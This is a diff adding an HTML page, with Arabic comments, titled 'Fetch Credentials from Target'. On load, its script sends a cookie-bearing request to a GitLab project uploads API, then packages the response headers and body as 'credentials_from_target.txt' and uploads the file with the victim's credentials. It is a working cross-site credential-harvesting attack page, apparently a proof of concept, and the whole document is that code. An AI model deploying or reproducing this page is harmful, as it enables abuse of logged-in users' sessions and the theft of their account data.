@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="ar">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Fetch Credentials from Target</title>
+  </head>
+  <body>
+    <script>
+      const xhr = new XMLHttpRequest();
+      xhr.open(
+        "POST",
+        "https://gitlab.com/api/v4/projects/65474602/uploads",
+        true
+      );
+
+      // السماح بإرسال الكردينشال (مثل ملفات تعريف الارتباط) مع الطلب
+      xhr.withCredentials = true;
+
+      xhr.onload = function () {
+        const responseHeaders = xhr.getAllResponseHeaders(); // استخراج الهيدر
+        const responseBody = xhr.responseText; // محتوى الاستجابة
+
+        // تحويل الكردينشال إلى نص لإضافته في ملف
+        const fileContent = `Response Headers:\n${responseHeaders}\n\nResponse Body:\n${responseBody}`;
+        const blob = new Blob([fileContent], { type: "text/plain" });
+
+        // إعداد نموذج البيانات وإرسال الملف
+        const formData = new FormData();
+        formData.append("file", blob, "credentials_from_target.txt");
+
+        const uploadXhr = new XMLHttpRequest();
+        uploadXhr.open(
+          "POST",
+          "https://gitlab.com/api/v4/projects/65474602/uploads",
+          true
+        );
+        uploadXhr.withCredentials = true;
+
+        uploadXhr.onload = function () {
+          if (uploadXhr.status >= 200 && uploadXhr.status < 300) {
+            console.log("File uploaded successfully");
+          } else {
+            console.error(
+              "Error uploading the file. Status:",
+              uploadXhr.status
+            );
+          }
+        };
+
+        uploadXhr.onerror = function () {
+          console.error("An error occurred while uploading the file");
+        };
+
+        uploadXhr.send(formData);
+
+        console.error("Failed to fetch credentials. Status:", xhr.status);
+      };
+
+      xhr.onerror = function () {
+        console.error("Error while making the request to the target site");
+      };
+
+      // إرسال الطلب إلى الموقع الهدف
+      xhr.send();
+    </script>
+  </body>
+</html>
